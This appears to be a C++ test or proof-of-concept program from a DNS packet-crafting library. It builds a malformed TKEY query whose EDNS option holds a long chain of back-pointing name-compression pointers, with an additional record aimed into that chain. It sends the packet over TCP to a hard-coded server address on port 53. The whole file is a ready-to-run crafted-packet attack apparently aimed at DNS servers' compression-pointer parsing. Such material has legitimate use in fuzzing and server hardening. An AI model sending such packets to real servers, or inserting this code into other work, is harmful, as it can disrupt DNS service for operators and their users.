#include "tcpv4client.hpp"
#include "dns.hpp"
#include <cstring>
#include <iostream>
#include <algorithm>
#include <arpa/inet.h>
#include <boost/numeric/conversion/cast.hpp>

const char *DNS_SERVER_ADDRESS = "49.212.193.254";

int main()
{
    dns::PacketInfo packet_info;
    std::vector<dns::QuestionSectionEntry> question_section;
    std::vector<dns::ResponseSectionEntry> answer_section, authority_section, additional_infomation_section;

    dns::QuestionSectionEntry question;
    question.q_domainname = "www.example.com";
    question.q_type       = dns::TYPE_TKEY;
    question.q_class      = dns::CLASS_IN;
    packet_info.question_section.push_back( question );

    std::vector<uint8_t> raw_data;
    uint16_t offset = sizeof(dns::PacketHeaderField) +
	( question.q_domainname.size() + 2 + 2 + 2 ) +
	( 1 + 2 + 2 + 4 + 2 +
	  2 + 2 );

    raw_data.push_back( 0 );  // "."
    raw_data.push_back( 0 );  // "."
    raw_data.push_back( 0 );  // "."
    offset += 3;
    for ( int i = 0 ; i < 0xb00/2 ; i++ ) {
	uint16_t d = ( 0xC000 + offset - 2 );
	raw_data.push_back( (uint8_t)(d >> 8) );
	raw_data.push_back( (uint8_t)(d & 0xff) );
	offset += 2;
    }    

    std::vector<dns::OptPseudoRROptPtr> options;

    options.push_back( dns::OptPseudoRROptPtr( new dns::RAWOption( 257, raw_data.size(), raw_data ) ) );
    dns::OptPseudoRecord opt;
    opt.payload_size = 1280;
    opt.record_options_data = boost::shared_ptr<dns::ResourceData>( new dns::RecordOptionsData( options ) );

    packet_info.additional_infomation_section.push_back( dns::generate_opt_pseudo_record( opt ) );


    dns::ResponseSectionEntry additonal;
    additonal.r_domainname = question.q_domainname;
    additonal.r_type       = dns::TYPE_A;
    additonal.r_class      = dns::CLASS_IN;
    additonal.r_ttl        = 30;
    additonal.r_resource_data = dns::ResourceDataPtr( new dns::RecordA( "172.16.0.1" ) );
    additonal.r_offset     = offset - 2;
    packet_info.additional_infomation_section.push_back( additonal );

    packet_info.id                   = 1234;
    packet_info.opcode               = 0;
    packet_info.query_response       = 0;
    packet_info.authoritative_answer = 0;
    packet_info.truncation           = 0;
    packet_info.recursion_desired    = false;
    packet_info.recursion_available  = 0;
    packet_info.zero_field           = 0;
    packet_info.authentic_data       = 0;
    packet_info.checking_disabled    = 0;
    packet_info.response_code        = 0;

    std::vector<uint8_t> packet = dns::generate_dns_packet( packet_info );

    tcpv4::ClientParameters tcp_param;
    tcp_param.destination_address = DNS_SERVER_ADDRESS;
    tcp_param.destination_port    = 53;
    tcpv4::Client tcp( tcp_param );
    uint16_t data_size = htons( boost::numeric_cast<uint16_t>( packet.size() ) );
    tcp.send( reinterpret_cast<uint8_t *>(&data_size), 2 );
    tcp.send( packet.data(), packet.size() );

    tcpv4::ConnectionInfo received_packet = tcp.receive_data( 2 );
    int response_size = ntohs( *reinterpret_cast<uint16_t *>( &received_packet.stream[0] ) );
    received_packet = tcp.receive_data( response_size );
    tcp.closeSocket();

    dns::ResponsePacketInfo res = dns::parse_dns_response_packet( received_packet.begin(),
                                                                  received_packet.end() );

    std::cout << res;


    return 0;
}

